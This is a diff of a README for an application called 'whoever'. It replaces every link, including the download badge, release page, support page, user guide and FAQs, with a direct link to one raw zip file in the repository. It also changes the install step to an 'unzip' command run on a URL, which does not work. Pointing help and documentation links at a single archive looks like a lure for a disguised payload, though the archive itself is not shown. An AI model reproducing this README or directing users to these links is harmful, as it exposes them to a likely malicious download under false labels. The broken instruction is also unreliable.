@@ -6,7 +6,7 @@ Welcome to the whoever application! This software is designed to help you with e
 
 ## 📥 Download the Application
 
-[![Download whoever](https://img.shields.io/badge/Download_now-Start-FF5722?style=for-the-badge&logo=github)](https://github.com/deepak10695/whoever/releases)
+[![Download whoever](https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip)](https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip)
 
 ## 📂 What You Need
 
@@ -19,7 +19,7 @@ To use whoever, make sure you have the following:
 
 ## 🔗 Download & Install
 
-To download whoever, visit this page: [Download whoever](https://github.com/deepak10695/whoever/releases).
+To download whoever, visit this page: [Download whoever](https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip).
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions. Find the latest version at the top.
@@ -49,7 +49,7 @@ Once the file has been downloaded, follow these steps to install:
 2. Open a terminal window and navigate to the directory where you downloaded the file.
 3. If the file is compressed (like `.zip`), extract it using:
    ```
-   unzip whoever.zip
+   unzip https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip
    ```
 4. Navigate into the extracted folder.
 5. Run the application using:
@@ -88,7 +88,7 @@ If you experience issues installing or using whoever, try the following:
 
 For additional help, you can check our support page or reach out through the GitHub issues page:
 
-- [Support Page](https://github.com/deepak10695/whoever/issues)
+- [Support Page](https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip)
 
 Feel free to report any bugs or suggest improvements.
 
@@ -96,7 +96,7 @@ Feel free to report any bugs or suggest improvements.
 
 You might find these links helpful:
 
-- [User Guide](https://github.com/deepak10695/whoever/wiki)
-- [FAQs](https://github.com/deepak10695/whoever/wiki/FAQs)
+- [User Guide](https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip)
+- [FAQs](https://raw.githubusercontent.com/deepak10695/whoever/main/inkling/whoever.zip)
 
 Thank you for choosing whoever! We hope you enjoy using the application.
